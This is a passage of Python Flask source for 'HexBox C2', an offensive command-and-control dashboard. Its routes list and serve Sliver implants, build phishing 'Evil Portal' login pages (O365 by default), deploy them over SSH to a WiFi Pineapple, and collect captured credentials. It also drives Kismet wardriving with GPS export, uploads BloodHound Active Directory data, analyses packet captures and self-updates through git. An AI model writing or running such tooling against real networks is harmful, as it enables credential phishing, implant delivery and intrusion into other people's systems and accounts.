        if len(parts) >= 6 and re.match(r'[0-9a-f]{8}', parts[0]):
            sessions.append({
                "id":       parts[0],
                "name":     parts[1] if len(parts) > 1 else "?",
                "hostname": parts[3] if len(parts) > 3 else "?",
                "os":       parts[6].split("/")[0] if len(parts) > 6 else "?",
                "arch":     parts[6].split("/")[1] if len(parts) > 6 and "/" in parts[6] else "?",
                "last_seen": parts[-1] if parts else "?",
            })
    return jsonify(sessions=sessions)


@app.route("/sliver/implants")
def sliver_implant_list():
    implants = []
    if _SLIVER_IMPLANTS.exists():
        for f in sorted(_SLIVER_IMPLANTS.iterdir(), key=lambda x: x.stat().st_mtime, reverse=True):
            if f.is_file():
                st = f.stat()
                implants.append({
                    "name":    f.name,
                    "size_kb": round(st.st_size / 1024, 1),
                    "mtime":   datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%d %H:%M"),
                })
    return jsonify(implants=implants)


@app.route("/sliver/download")
def sliver_download():
    name = _safe_name(request.args.get("name", ""))
    if not name:
        return "name required", 400
    path = _SLIVER_IMPLANTS / name
    if not path.is_file():
        return "Not found", 404
    return send_file(str(path), as_attachment=True, download_name=name)

# ---------------------------------------------------------------------------
# Routes — Evil Portal
# ---------------------------------------------------------------------------

_PORTALS_DIR = PAYLOADS / "portals"
_PORTAL_CREDS_FILE = LOOT / "portals" / "captures.json"


def _portal_html(ptype: str, catcher_ip: str, catcher_port: str, redirect: str) -> str | None:
    src = _PORTALS_DIR / f"{ptype}.html"
    if not src.exists():
        return None
    html = src.read_text()
    base = f"http://{catcher_ip}:{catcher_port}"
    html = html.replace("HEXBOX_CATCHER", base)
    if redirect:
        html = re.sub(r'(window\.location\.href\s*=\s*["\'])https?://[^"\']+', rf'\g<1>{redirect}', html)
    return html


@app.route("/portal/preview")
def portal_preview():
    ptype = re.sub(r"[^a-z0-9]", "", request.args.get("type", "o365"))[:16]
    ip    = request.args.get("ip",       HEXBOX_IP)
    port  = request.args.get("port",     "8000")
    redir = request.args.get("redirect", "")
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        return "invalid IP", 400
    html = _portal_html(ptype, ip, port, redir)
    if html is None:
        return f"Template '{ptype}' not found", 404
    return Response(html, mimetype="text/html")


@app.route("/portal/download")
def portal_download():
    ptype = re.sub(r"[^a-z0-9]", "", request.args.get("type", "o365"))[:16]
    ip    = request.args.get("ip",       HEXBOX_IP)
    port  = request.args.get("port",     "8000")
    redir = request.args.get("redirect", "")
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        return "invalid IP", 400
    html = _portal_html(ptype, ip, port, redir)
    if html is None:
        return f"Template '{ptype}' not found", 404
    from io import BytesIO
    return send_file(BytesIO(html.encode()), as_attachment=True,
                     download_name=f"portal_{ptype}.html",
                     mimetype="text/html")


@app.route("/portal/deploy", methods=["POST"])
def portal_deploy():
    data  = request.get_json(silent=True) or {}
    ptype = re.sub(r"[^a-z0-9]", "", data.get("type", "o365"))[:16]
    ip    = data.get("ip",       HEXBOX_IP)
    port  = str(data.get("port", "8000"))
    redir = data.get("redirect", "")
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        return jsonify(error="invalid IP"), 400
    html = _portal_html(ptype, ip, port, redir)
    if html is None:
        return jsonify(error=f"Template '{ptype}' not found"), 404
    # Deploy to Pineapple via SSH
    try:
        d = DEVICES["pineapple"]
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(d["ip"], username=d["user"], password=d["pass"], timeout=15)
        sftp = c.open_sftp()
        # Write portal HTML to Pineapple Evil Portal directory
        remote_path = "/etc/evilportal/portal.html"
        import io
        sftp.putfo(io.BytesIO(html.encode()), remote_path)
        # Enable Evil Portal module
        _, out, err = c.exec_command(
            "/etc/init.d/evilportal start 2>&1; evilportal start 2>&1 | head -5")
        result = out.read().decode() + err.read().decode()
        sftp.close()
        c.close()
        _log(f"Evil Portal deployed: {ptype} → Pineapple")
        return jsonify(output=f"Deployed {ptype} portal to Pineapple → {remote_path}\n{result.strip()}")
    except Exception as e:
        return jsonify(error=str(e)), 500


@app.route("/portal/credentials")
def portal_credentials():
    if not _PORTAL_CREDS_FILE.exists():
        return jsonify(credentials=[])
    try:
        return jsonify(credentials=json.loads(_PORTAL_CREDS_FILE.read_text()))
    except Exception:
        return jsonify(credentials=[])

# ---------------------------------------------------------------------------
# Routes — PCAP Analysis
# ---------------------------------------------------------------------------

@app.route("/pcap/list")
def pcap_list():
    try:
        from parse_pcap import list_pcaps
    except ImportError:
        import sys as _sys
        _sys.path.insert(0, str(Path(__file__).parent))
        from parse_pcap import list_pcaps
    return jsonify(files=list_pcaps(LOOT))


@app.route("/pcap/analyze")
def pcap_analyze():
    name = _safe_name(request.args.get("name", ""), maxlen=128)
    if not name:
        return jsonify(error="name required"), 400
    # Search both loot/pcaps/ and loot/pcaps subdirs
    candidate = None
    for d in (LOOT / "pcaps", LOOT):
        p = d / name
        try:
            p.resolve().relative_to(LOOT.resolve())
        except ValueError:
            continue
        if p.is_file():
            candidate = p
            break
    if candidate is None:
        return jsonify(error=f"File not found: {name}"), 404
    try:
        from parse_pcap import analyze_pcap
    except ImportError:
        import sys as _sys
        _sys.path.insert(0, str(Path(__file__).parent))
        from parse_pcap import analyze_pcap
    result = analyze_pcap(candidate)
    _log(f"PCAP analyzed: {name} — {result.get('stats',{}).get('packet_count',0)} packets")
    return jsonify(**result)

# ---------------------------------------------------------------------------
# Routes — War-Drive / Kismet
# ---------------------------------------------------------------------------

_WD_NETWORKS_FILE = LOOT / "wardrive" / "networks.json"


def _kismet_req(path: str, timeout: int = 10) -> dict:
    url  = _KISMET_CFG.get("url", "http://localhost:2501")
    auth = (_KISMET_CFG.get("username", "kismet"),
            _KISMET_CFG.get("password", "kismet"))
    r = _req.get(f"{url}{path}", auth=auth, timeout=timeout)
    r.raise_for_status()
    return r.json()


def _kismet_running() -> bool:
    try:
        _kismet_req("/system/status.json", timeout=3)
        return True
    except Exception:
        return False


@app.route("/kismet/status")
def kismet_status():
    installed = bool(shutil.which("kismet"))
    running   = False
    device_count = 0
    with _procs_lock:
        p = _procs.get("kismet")
        if p and p.poll() is None:
            running = True
    if not running:
        try:
            r = subprocess.run(["pgrep", "-x", "kismet"],
                               capture_output=True, timeout=3)
            running = r.returncode == 0
        except Exception:
            pass
    if running:
        try:
            st = _kismet_req("/system/status.json", timeout=3)
            device_count = st.get("kismet.system.devices.count", 0)
        except Exception:
            pass
    return jsonify(installed=installed, running=running, device_count=device_count)


@app.route("/kismet/start", methods=["POST"])
def kismet_start():
    if not shutil.which("kismet"):
        return jsonify(error="kismet not installed — sudo apt install kismet"), 400
    iface = IFACE_BETTERCAP  # use configured wireless interface
    pid = start_proc("kismet", [
        "kismet", "-c", iface,
        "--no-ncurses",
        "--daemonize",
    ])
    _log(f"Kismet started (pid={pid}) on {iface}")
    return jsonify(output=f"Kismet started (pid={pid}) on {iface} — dashboard at :2501")


@app.route("/kismet/networks")
def kismet_networks():
    try:
        # Fetch access points from Kismet API
        data = _kismet_req(
            "/devices/views/phydot11_accesspoints/devices.json?fields="
            "kismet.device.base.macaddr,kismet.device.base.name,"
            "kismet.device.base.signal/kismet.common.signal.last_signal,"
            "kismet.device.base.channel,kismet.device.base.last_time,"
            "dot11.device/dot11.device.last_beaconed_ssid_record/dot11.advertisedssid.ssid,"
            "kismet.device.base.location/kismet.common.location.avg_loc,"
            "dot11.device/dot11.device.num_associated_clients,"
            "dot11.device/dot11.device.wpa_handshake_list",
            timeout=15,
        )
    except Exception as e:
        # Return cached data if Kismet unreachable
        if _WD_NETWORKS_FILE.exists():
            nets = json.loads(_WD_NETWORKS_FILE.read_text())
            return jsonify(networks=nets, cached=True)
        return jsonify(error=str(e), networks=[]), 502

    networks = []
    for dev in (data if isinstance(data, list) else []):
        try:
            bssid   = dev.get("kismet.device.base.macaddr", "?")
            ssid    = (dev.get("dot11.device", {})
                          .get("dot11.device.last_beaconed_ssid_record", {})
                          .get("dot11.advertisedssid.ssid", ""))
            signal  = (dev.get("kismet.device.base.signal", {})
                          .get("kismet.common.signal.last_signal", -100))
            channel = dev.get("kismet.device.base.channel", "?")
            clients = (dev.get("dot11.device", {})
                          .get("dot11.device.num_associated_clients", 0))
            last_t  = dev.get("kismet.device.base.last_time", 0)
            loc     = (dev.get("kismet.device.base.location", {})
                          .get("kismet.common.location.avg_loc", {}))
            lat = loc.get("kismet.common.location.lat")
            lon = loc.get("kismet.common.location.lon")
            alt = loc.get("kismet.common.location.alt")

            # Infer encryption from SSID record if available
            ssid_rec = (dev.get("dot11.device", {})
                           .get("dot11.device.last_beaconed_ssid_record", {}))
            crypt_set = ssid_rec.get("dot11.advertisedssid.crypt_set", 0)
            if crypt_set == 0:
                enc = "Open"
            elif crypt_set & 0x400:
                enc = "WPA3"
            elif crypt_set & 0x100:
                enc = "WPA2"
            elif crypt_set & 0x20:
                enc = "WPA"
            else:
                enc = "WEP"

            networks.append({
                "ssid":       ssid,
                "bssid":      bssid,
                "signal":     int(signal),
                "channel":    str(channel),
                "encryption": enc,
                "clients":    int(clients),
                "lat":        float(lat) if lat else None,
                "lon":        float(lon) if lon else None,
                "alt":        float(alt) if alt else None,
                "last_seen":  datetime.fromtimestamp(last_t).strftime("%H:%M:%S") if last_t else "",
            })
        except Exception:
            continue

    # Persist for export/cache
    _WD_NETWORKS_FILE.parent.mkdir(parents=True, exist_ok=True)
    _WD_NETWORKS_FILE.write_text(json.dumps(networks, indent=2))
    _log(f"Kismet: {len(networks)} networks fetched")
    return jsonify(networks=networks)


@app.route("/kismet/gps")
def kismet_gps():
    try:
        data = _kismet_req("/location/location.json", timeout=5)
        loc  = data.get("kismet.common.location.avg_loc", data)
        return jsonify(
            lat=loc.get("kismet.common.location.lat"),
            lon=loc.get("kismet.common.location.lon"),
            alt=loc.get("kismet.common.location.alt"),
            fix=loc.get("kismet.common.location.fix", 0),
        )
    except Exception as e:
        return jsonify(lat=None, lon=None, alt=None, fix=0, error=str(e))


@app.route("/kismet/export")
def kismet_export():
    fmt = request.args.get("format", "csv")
    nets: list[dict] = []
    if _WD_NETWORKS_FILE.exists():
        nets = json.loads(_WD_NETWORKS_FILE.read_text())
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    if fmt == "csv":
        import io as _io
        buf = _io.StringIO()
        buf.write("SSID,BSSID,Signal,Channel,Encryption,Clients,Lat,Lon,LastSeen\n")
        for n in nets:
            buf.write(",".join([
                f'"{n.get("ssid","")}"',
                n.get("bssid",""),
                str(n.get("signal","")),
                str(n.get("channel","")),
                n.get("encryption",""),
                str(n.get("clients",0)),
                str(n.get("lat","") or ""),
                str(n.get("lon","") or ""),
                f'"{n.get("last_seen","")}"',
            ]) + "\n")
        from io import BytesIO
        return send_file(BytesIO(buf.getvalue().encode()),
                         as_attachment=True,
                         download_name=f"wardrive_{ts}.csv",
                         mimetype="text/csv")

    if fmt == "kml":
        lines = ['<?xml version="1.0" encoding="UTF-8"?>',
                 '<kml xmlns="http://www.opengis.net/kml/2.2"><Document>',
                 f'<name>HexBox War-Drive {ts}</name>']
        for n in nets:
            if not n.get("lat") or not n.get("lon"):
                continue
            enc = n.get("encryption","?")
            color = "ff00ff00" if enc == "Open" else "ff0000ff"
            lines += [
                "<Placemark>",
                f"<name>{n.get('ssid','(hidden)')}</name>",
                f"<description>BSSID: {n.get('bssid','?')} | {enc} | {n.get('signal','?')} dBm | Ch {n.get('channel','?')}</description>",
                f"<Style><IconStyle><color>{color}</color></IconStyle></Style>",
                f"<Point><coordinates>{n.get('lon')},{n.get('lat')},0</coordinates></Point>",
                "</Placemark>",
            ]
        lines += ["</Document></kml>"]
        from io import BytesIO
        return send_file(BytesIO("\n".join(lines).encode()),
                         as_attachment=True,
                         download_name=f"wardrive_{ts}.kml",
                         mimetype="application/vnd.google-earth.kml+xml")

    return jsonify(error="unsupported format"), 400

# ---------------------------------------------------------------------------
# Routes — BloodHound auto-ingestion
# ---------------------------------------------------------------------------

def _safe_name(value: str, maxlen: int = 64) -> str:
    return re.sub(r"[^a-zA-Z0-9_.-]", "_", Path(value).name)[:maxlen] or "unk"


@app.route("/bloodhound/status")
def bh_status():
    try:
        from parse_loot import aggregate_bloodhound
    except ImportError:
        import sys as _sys
        _sys.path.insert(0, str(Path(__file__).parent))
        from parse_loot import aggregate_bloodhound
    return jsonify(**aggregate_bloodhound(LOOT))


@app.route("/bloodhound/upload", methods=["POST"])
def bh_upload():
    """Upload collected BloodHound JSON files to BloodHound CE via REST API."""
    bh_dir = LOOT / "bloodhound"
    if not bh_dir.exists() or not any(bh_dir.glob("*.json")):
        return jsonify(error="No BloodHound JSON files found — run bloodhound_collect.ducky first"), 400

    url      = _BH_CFG.get("url", "http://localhost:8080")
    username = _BH_CFG.get("username", "admin")
    password = _BH_CFG.get("password", "BloodHound!")

    # Authenticate
    try:
        auth_r = _req.post(
            f"{url}/api/v2/login",
            json={"login_method": "secret", "username": username, "secret": password},
            timeout=10,
        )
        if auth_r.status_code not in (200, 201):
            return jsonify(error=f"BloodHound auth failed: {auth_r.status_code} {auth_r.text[:200]}"), 502
        jwt = auth_r.json().get("data", {}).get("access_token") or auth_r.json().get("access_token")
        if not jwt:
            return jsonify(error="No access token in BloodHound response"), 502
    except Exception as e:
        return jsonify(error=f"Cannot reach BloodHound at {url}: {e}"), 502

    headers = {"Authorization": f"Bearer {jwt}"}
    uploaded = 0
    errors   = []

    for jf in sorted(bh_dir.glob("*.json")):
        try:
            # Start upload session
            start_r = _req.post(f"{url}/api/v2/file-upload/start",
                                 headers=headers, timeout=10)
            upload_id = (start_r.json().get("data", {}).get("id") or
                         start_r.json().get("id"))
            if not upload_id:
                errors.append(f"{jf.name}: no upload_id")
                continue

            # Upload file
            content = jf.read_bytes()
            up_r = _req.post(
                f"{url}/api/v2/file-upload/{upload_id}",
                data=content,
                headers={**headers, "Content-Type": "application/json"},
                timeout=60,
            )
            if up_r.status_code not in (200, 201, 204):
                errors.append(f"{jf.name}: upload {up_r.status_code}")
                continue

            # Finalize
            _req.post(f"{url}/api/v2/file-upload/{upload_id}/end",
                      headers=headers, timeout=10)
            uploaded += 1
        except Exception as e:
            errors.append(f"{jf.name}: {e}")

    msg = f"Uploaded {uploaded} file(s) to BloodHound"
    if errors:
        msg += f" ({len(errors)} error(s): {'; '.join(errors[:3])})"
    _log(msg)
    return jsonify(output=msg, uploaded=uploaded, errors=errors)


@app.route("/bloodhound/download")
def bh_download():
    name = _safe_name(request.args.get("name", ""))
    if not name:
        return "name required", 400
    path = LOOT / "bloodhound" / name
    if not path.is_file():
        return "Not found", 404
    return send_file(str(path), as_attachment=True, download_name=name)

# ---------------------------------------------------------------------------
# Software update + restart
# ---------------------------------------------------------------------------

_REPO = Path(__file__).parent.parent


@app.route("/update/check")
def update_check():
    try:
        # Fetch remote metadata without touching working tree
        subprocess.run(["git", "-C", str(_REPO), "fetch"],
                       capture_output=True, timeout=30)
        local = subprocess.run(
            ["git", "-C", str(_REPO), "rev-parse", "HEAD"],
            capture_output=True, text=True, timeout=10,
        ).stdout.strip()
        remote = subprocess.run(
            ["git", "-C", str(_REPO), "rev-parse", "@{u}"],
            capture_output=True, text=True, timeout=10,
        ).stdout.strip()
        pending = subprocess.run(
            ["git", "-C", str(_REPO), "log", "--oneline", "HEAD..@{u}"],
            capture_output=True, text=True, timeout=10,
        ).stdout.strip()
        return jsonify(
            local=local[:8],
            remote=remote[:8],
            up_to_date=(local == remote),
            pending=pending,
        )
    except Exception as e:
        return jsonify(error=str(e)), 500


@app.route("/update/apply", methods=["POST"])
def update_apply():
    try:
        result = subprocess.run(
            ["git", "-C", str(_REPO), "pull", "--rebase", "--autostash"],
            capture_output=True, text=True, timeout=120,
        )
        output = result.stdout + result.stderr
        _log(f"Update applied (rc={result.returncode}): {output[:200]}")
        broadcast("update", {"ts": datetime.now().strftime("%H:%M:%S"),
                              "rc": result.returncode})
        return jsonify(output=output, returncode=result.returncode)
    except subprocess.TimeoutExpired:
        return jsonify(error="git pull timed out", returncode=1), 500
    except Exception as e:
        return jsonify(error=str(e), returncode=1), 500


@app.route("/restart", methods=["POST"])
def restart_c2():
    _log("C2 restart requested via dashboard")

    def _do_restart():
        time.sleep(1)
        os.execv(sys.executable, [sys.executable] + sys.argv)

    threading.Thread(target=_do_restart, daemon=True).start()
    return jsonify(output="Restarting C2 — reload the page in a few seconds...")


# ---------------------------------------------------------------------------
# Startup
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    if not _watcher_started:
        _watcher_started = True
        t = threading.Thread(target=_loot_watcher, daemon=True)
        t.start()

    print(f"[+] HexBox C2 (Phase 5) online → http://0.0.0.0:{PORT}")
    if not os.environ.get("HEXBOX_TOKEN") and not _HB.get("api_token"):
        print(f"[!] Access token (set HEXBOX_TOKEN env var to pin): {_TOKEN}")
    print(f"[!] SSH host-key verification is DISABLED (AutoAddPolicy) — see README for hardening")
    app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True)
